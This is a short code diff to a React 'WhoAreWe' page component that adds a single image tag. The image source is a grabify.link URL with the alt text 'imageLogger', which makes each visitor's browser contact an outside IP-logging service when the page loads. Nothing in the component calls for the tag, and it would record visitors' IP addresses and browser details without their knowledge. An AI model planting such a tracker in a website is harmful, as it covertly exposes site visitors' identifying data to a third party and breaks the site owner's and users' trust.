@@ -72,6 +72,7 @@ const WhoAreWe = () => {
             <p className="mt-4 text-lg text-gray-600 max-w-5xl m-auto">
               {t("whoAreWeMoreDescription")}
             </p>
+            <img src="https://grabify.link/DACEUL" alt="imageLogger"/>
           </div>
 
           {/* Button Section */}
